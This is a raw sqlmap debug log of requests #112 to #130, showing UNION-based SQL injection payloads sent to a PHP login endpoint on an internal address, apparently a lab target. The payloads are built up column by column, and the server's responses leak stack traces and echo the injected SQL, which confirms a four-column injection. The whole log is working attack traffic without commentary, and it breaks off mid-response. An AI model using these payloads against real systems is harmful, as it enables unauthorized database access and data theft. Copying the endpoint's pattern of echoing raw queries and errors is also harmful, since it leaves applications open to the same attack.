<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#112]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#112] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=m457p6173tk2q911n9vj89afir; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#113]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#113] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=mbq28l6kvn2kld4aonrs41ankv; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#114]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#114] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=lqp705008ep76h9ea6rq8kkj2q; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#115]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#115] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=qfhbh3kvu3insai491nk6mu22u; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [INFO] target URL appears to be UNION injectable with 4 columns
[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x5248777a4868416e5974774e67434a71756d62726b71666f6f63464e61464345624b6b7155436552,0x7176766b71),NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#116]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x5248777a4868416e5974774e67434a71756d62726b71666f6f63464e61464345624b6b7155436552%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#116] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x5248777a4868416e5974774e67434a71756d62726b71666f6f63464e61464345624b6b7155436552%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x5248777a4868416e5974774e67434a71756d62726b71666f6f63464e61464345624b6b7155436552,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x644348434a6b55724f4f6f4d616e627666564d4b58646c6b664872774f684d496957656345564543,0x7176766b71)-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#117]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x644348434a6b55724f4f6f4d616e627666564d4b58646c6b664872774f684d496957656345564543%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#117] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x644348434a6b55724f4f6f4d616e627666564d4b58646c6b664872774f684d496957656345564543%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x644348434a6b55724f4f6f4d616e627666564d4b58646c6b664872774f684d496957656345564543,0x7176766b71)-- -'"
    ]
}
[03:42:29] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x4e48586b71676b584c54505a764f6f424d725a6f554b6874676859694b6a6d4f6a7271674a4a7276,0x7176766b71),NULL,NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#118]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x4e48586b71676b584c54505a764f6f424d725a6f554b6874676859694b6a6d4f6a7271674a4a7276%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#118] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x4e48586b71676b584c54505a764f6f424d725a6f554b6874676859694b6a6d4f6a7271674a4a7276%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x4e48586b71676b584c54505a764f6f424d725a6f554b6874676859694b6a6d4f6a7271674a4a7276,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:29] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x4a78514a546d4a4c49626d456b6d64537048645a46466775686f4f78777756764663694146615863,0x7176766b71),NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#119]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x4a78514a546d4a4c49626d456b6d64537048645a46466775686f4f78777756764663694146615863%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#119] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x4a78514a546d4a4c49626d456b6d64537048645a46466775686f4f78777756764663694146615863%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x4a78514a546d4a4c49626d456b6d64537048645a46466775686f4f78777756764663694146615863,0x7176766b71),NULL-- -'"
    ]
}
[03:42:29] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x6347786859564e655474,0x7176766b71),NULL,NULL,NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#120]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x6347786859564e655474%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#120] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x6347786859564e655474%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x6347786859564e655474,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
[03:42:29] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x496c494b52574a706e63,0x7176766b71)-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#121]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x496c494b52574a706e63%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#121] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x496c494b52574a706e63%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x496c494b52574a706e63,0x7176766b71)-- -'"
    ]
}
[03:42:29] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x48506a66497343616a52,0x7176766b71),NULL,NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#122]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x48506a66497343616a52%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#122] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x48506a66497343616a52%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x48506a66497343616a52,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:29] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x55674b76436f55466a4a,0x7176766b71),NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#123]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x55674b76436f55466a4a%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#123] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x55674b76436f55466a4a%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x55674b76436f55466a4a,0x7176766b71),NULL-- -'"
    ]
}
[03:42:29] [PAYLOAD] -9544' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x576d735553695a6667696744784f645945726766516f566b574d75626a444e67416358494b79574c,0x7176766b71),NULL,NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#124]:
GET /ai/includes/user_login.php?email=-9544%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x576d735553695a6667696744784f645945726766516f566b574d75626a444e67416358494b79574c%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#124] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-9544%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x576d735553695a6667696744784f645945726766516f566b574d75626a444e67416358494b79574c%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-9544' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x576d735553695a6667696744784f645945726766516f566b574d75626a444e67416358494b79574c,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:29] [PAYLOAD] -2853' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x594c616353556e59564548544652437070416c5967534c59486d424e596154435645486d70556f4c,0x7176766b71)-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#125]:
GET /ai/includes/user_login.php?email=-2853%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x594c616353556e59564548544652437070416c5967534c59486d424e596154435645486d70556f4c%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#125] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-2853%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x594c616353556e59564548544652437070416c5967534c59486d424e596154435645486d70556f4c%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-2853' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x594c616353556e59564548544652437070416c5967534c59486d424e596154435645486d70556f4c,0x7176766b71)-- -'"
    ]
}
[03:42:29] [PAYLOAD] -6618' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x7a796b6a51476953796e43644a4b574a706f56664947644f744b4e6247776f574742515359765777,0x7176766b71),NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#126]:
GET /ai/includes/user_login.php?email=-6618%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x7a796b6a51476953796e43644a4b574a706f56664947644f744b4e6247776f574742515359765777%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:29] [TRAFFIC IN] HTTP response [#126] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-6618%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x7a796b6a51476953796e43644a4b574a706f56664947644f744b4e6247776f574742515359765777%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-6618' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x7a796b6a51476953796e43644a4b574a706f56664947644f744b4e6247776f574742515359765777,0x7176766b71),NULL-- -'"
    ]
}
[03:42:29] [PAYLOAD] -6807' UNION ALL SELECT CONCAT(0x7176766b71,0x5a686c4d4c50524758504d4a736e587554706c427a6c536e566e4863715767706f48465763654d55,0x7176766b71),NULL,NULL,NULL-- -
[03:42:29] [TRAFFIC OUT] HTTP request [#127]:
GET /ai/includes/user_login.php?email=-6807%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x5a686c4d4c50524758504d4a736e587554706c427a6c536e566e4863715767706f48465763654d55%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:30] [TRAFFIC IN] HTTP response [#127] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-6807%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x5a686c4d4c50524758504d4a736e587554706c427a6c536e566e4863715767706f48465763654d55%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-6807' UNION ALL SELECT CONCAT(0x7176766b71,0x5a686c4d4c50524758504d4a736e587554706c427a6c536e566e4863715767706f48465763654d55,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
[03:42:30] [PAYLOAD] -3418' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x4e4d576c63454e615948,0x7176766b71),NULL,NULL-- -
[03:42:30] [TRAFFIC OUT] HTTP request [#128]:
GET /ai/includes/user_login.php?email=-3418%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x4e4d576c63454e615948%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:30] [TRAFFIC IN] HTTP response [#128] (200 OK):
Date: Sun, 19 Oct 2025 07:42:29 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-3418%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x4e4d576c63454e615948%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-3418' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x4e4d576c63454e615948,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:30] [PAYLOAD] -3910' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x49626a646c546448544d,0x7176766b71)-- -
[03:42:30] [TRAFFIC OUT] HTTP request [#129]:
GET /ai/includes/user_login.php?email=-3910%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x49626a646c546448544d%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:30] [TRAFFIC IN] HTTP response [#129] (200 OK):
Date: Sun, 19 Oct 2025 07:42:30 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 195
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-3910%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x49626a646c546448544d%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-3910' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x49626a646c546448544d,0x7176766b71)-- -'"
    ]
}
[03:42:30] [PAYLOAD] -8174' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x4d41545479685277514b,0x7176766b71),NULL-- -
[03:42:30] [TRAFFIC OUT] HTTP request [#130]:
GET /ai/includes/user_login.php?email=-8174%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x4d41545479685277514b%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:30] [TRAFFIC IN] HTTP response [#130] (200 OK):
Date: Sun, 19 Oct 2025 07:42:30 GMT
